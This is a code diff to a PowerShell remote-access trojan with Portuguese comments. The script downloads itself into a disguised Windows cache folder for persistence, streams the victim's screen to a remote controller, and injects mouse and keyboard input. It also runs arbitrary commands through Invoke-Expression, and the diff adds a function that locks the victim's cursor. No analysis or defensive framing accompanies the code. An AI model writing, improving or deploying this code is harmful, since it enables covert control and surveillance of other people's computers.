@@ -15,6 +15,7 @@ if (-not $isAdmin) {
     exit
 }
 
+# ===== PERSISTÊNCIA BLINDADA =====
 $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
 New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force -ErrorAction SilentlyContinue | Out-Null
 try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
@@ -38,6 +39,13 @@ if (-not ("R9KCore" -as [type])) {
         public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
         [DllImport("user32.dll")]
         public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+        [DllImport("user32.dll")]
+        public static extern bool ClipCursor(IntPtr lpRect);
+        
+        [StructLayout(LayoutKind.Sequential)]
+        public struct RECT { public int Left, Top, Right, Bottom; }
+        [DllImport("user32.dll")]
+        public static extern bool ClipCursor(ref RECT lpRect);
 
         public static string CaptureScreen(int maxW, long quality) {
             try {
@@ -46,8 +54,7 @@ if (-not ("R9KCore" -as [type])) {
                     using (Graphics g = Graphics.FromImage(bmp)) { g.CopyFromScreen(0, 0, 0, 0, bmp.Size); }
                     Bitmap finalBmp = bmp;
                     if (maxW > 0 && bmp.Width > maxW) {
-                        int newW = maxW;
-                        int newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
+                        int newW = maxW; int newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
                         finalBmp = new Bitmap(newW, newH);
                         using (Graphics g2 = Graphics.FromImage(finalBmp)) {
                             g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBilinear;
@@ -65,6 +72,16 @@ if (-not ("R9KCore" -as [type])) {
                 }
             } catch { return null; }
         }
+
+        public static void LockMouse() {
+            RECT rect = new RECT();
+            rect.Left = 0; rect.Top = 0;
+            rect.Right = Screen.PrimaryScreen.Bounds.Width;
+            rect.Bottom = Screen.PrimaryScreen.Bounds.Height;
+            ClipCursor(ref rect);
+        }
+        public static void UnlockMouse() { ClipCursor(IntPtr.Zero); }
+
         private static ImageCodecInfo GetEncoder(ImageFormat format) {
             ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
             foreach (ImageCodecInfo codec in codecs) { if (codec.FormatID == format.Guid) return codec; }
@@ -107,7 +124,7 @@ while ($true) {
                 $response = ""
                 switch ($verb) {
                     'screenshot' {
-                        $b64 = [R9KCore]::CaptureScreen(3840, 85)
+                        $b64 = [R9KCore]::CaptureScreen(1920, 85)
                         if ($b64) { $writer.WriteLine("SCREEN:$b64") } else { $writer.WriteLine("SCREEN_ERROR") }
                     }
                     'move' {
@@ -131,23 +148,23 @@ while ($true) {
                     'mw' { [R9KCore]::mouse_event(0x0800, 0,0,[uint32][int]$arg,0) }
                     'kd' { [R9KCore]::keybd_event([byte][int]$arg, 0, 0, [UIntPtr]::Zero) }
                     'ku' { [R9KCore]::keybd_event([byte][int]$arg, 0, 2, [UIntPtr]::Zero) }
-                    'lock_mouse' { $response = "MOUSE_LOCKED" }
-                    'unlock_mouse' { $response = "MOUSE_UNLOCKED" }
+                    'lock_mouse' { [R9KCore]::LockMouse(); $response = "MOUSE_LOCKED" }
+                    'unlock_mouse' { [R9KCore]::UnlockMouse(); $response = "MOUSE_UNLOCKED" }
                     'ping' { $response = "PONG" }
                     'exec' { try { $response = Invoke-Expression $arg 2>&1 | Out-String } catch { $response = "EXEC_ERR" } }
                     default { $response = "UNKNOWN: $verb" }
                 }
                 if ($response) { $writer.WriteLine($response) }
             } else {
-                Start-Sleep -Milliseconds 15
+                Start-Sleep -Milliseconds 10
             }
 
             if ($streaming -and $client.Connected) {
-                $b64 = [R9KCore]::CaptureScreen(1024, 40)
+                $b64 = [R9KCore]::CaptureScreen(1024, 30) # Qualidade e tamanho reduzidos pra acabar com o lag
                 if ($b64) {
                     try { $writer.WriteLine("SCREEN:$b64") } catch { break }
                 }
-                Start-Sleep -Milliseconds 60
+                Start-Sleep -Milliseconds 100 # Delay maior pra aliviar a rede
             }
         }
     } catch {} finally {
